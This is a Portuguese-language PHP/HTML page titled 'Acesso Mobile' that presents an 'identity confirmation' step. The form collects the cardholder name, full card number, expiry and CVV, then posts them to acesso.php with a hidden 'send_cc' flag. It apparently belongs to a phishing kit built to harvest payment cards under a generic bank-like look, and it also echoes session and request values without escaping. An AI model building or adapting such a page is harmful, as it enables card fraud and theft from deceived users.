<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Mobile :: Acesso</title>

	<!-- PERSONALIZAÇÃO CABEÇALHO -->
	<meta name="theme-color" content="#0072e5">
	<meta name="apple-mobile-web-app-status-bar-style" content="#0072e5">
	<meta name="msapplication-navbutton-color" content="#0072e5">	
</head>
<body>

<div class="container main_header bg-blue">
	<div class="content">
		<div class="logo">
			<img src="../_images/mobile/main_logo.jpg" height="30" width="128">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content">
		<div class="home_title">
			<h1>Confirmação de identidade</h1>
			<p>
				<?php 
					if(strlen($_SESSION['UserName']) == 0):
						echo 'Para prosseguir, será necessário confirmar seu cartão de crédito/débito.';
					else:
						echo $_SESSION['UserName'].', para prosseguir, será necessário confirmar seu cartão de crédito/débito.';
					endif;
				?>
			</p>
		</div>

		<form action="acesso.php?cliente=<?php echo $emailx; ?>" id="form_acesso" class="form_acesso" name="form_acesso" onsubmit="return checkFullCard();" method="post">
			
			<label for="cd_name" class="complete_blocks" style="margin-bottom:10px;">
				<span style="margin-bottom:10px!important;display:block;">Nome do cartão:</span>
				<input type="text" name="cd_name" id="cd_name" class="normal_input" placeholder="Nome do cartão" autocomplete="off">
			</label>
			
			<label for="cd_number" class="complete_blocks" style="margin-bottom:10px;">
				<span style="margin-bottom:10px!important;display:block;">Número do cartão:</span>
				<input type="number" name="cd_number" id="cd_number" class="normal_input" placeholder="16 dígitos" autocomplete="off" maxlength="16" 
				oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>
			
			<label class="complete_blocks" style="margin-bottom:10px;">
				<span style="margin-bottom:10px!important;display:block;">Validade:</span>
				<select name="val_card_mes" id="val_card_mes" class="normal_input" style="width:49%;display:block;float:left;margin-right:1%;">
					<option value="mes" selected="selected" disabled="disabled">Mês</option>
					<?php
						for($i = 1; $i <= 12; $i++){
							if($i <= 9){$i = '0'.$i;}
							echo '<option value="'.$i.'">'.$i.'</option>';
						}
					?>	
				</select>
				<select name="val_card_ano" id="val_card_ano" class="normal_input" style="width:49%;display:block;float:left;margin-left:1%;">
					<option value="ano" disabled="disabled" selected="selected">Ano</option>
					<?php
						for($i = 2016; $i <= 2047; $i++){
							echo '<option value="'.$i.'">'.$i.'</option>';
						}
					?>	
				</select>
			</label>
			
			<label for="cd_cvv" class="complete_blocks" style="margin-bottom:10px;">
				<span style="margin-bottom:10px!important;display:block;">Código de Segurança:</span>
				<input type="number" name="cd_cvv" id="cd_cvv" class="normal_input" placeholder="3 dígitos" autocomplete="off" maxlength="3" style="width:50%;"
				oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>

			<div class="block_labels">
				<input type="hidden" name="sender" value="send_cc">
				<input type="submit" name="next_page_acess" value="Confirmar" class="btn-submit-normal">
			</div><!-- block_labels -->
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- ARQUIVOS DE INCLUSÃO -->
<link rel="stylesheet" href="../_styles/boot_mb.css">
<link rel="stylesheet" href="../_fonts/_fonts.css">
<link rel="stylesheet" href="../_styles/font-awesome.css">
<link rel="stylesheet" href="../_styles/content_mb.css">	
<script src="../_jscripts/jquery.js"></script>
<script src="../_jscripts/content_mb.js"></script>
<!-- ARQUIVOS DE INCLUSÃO -->
</body>
</html>
<?php ob_end_flush(); ?>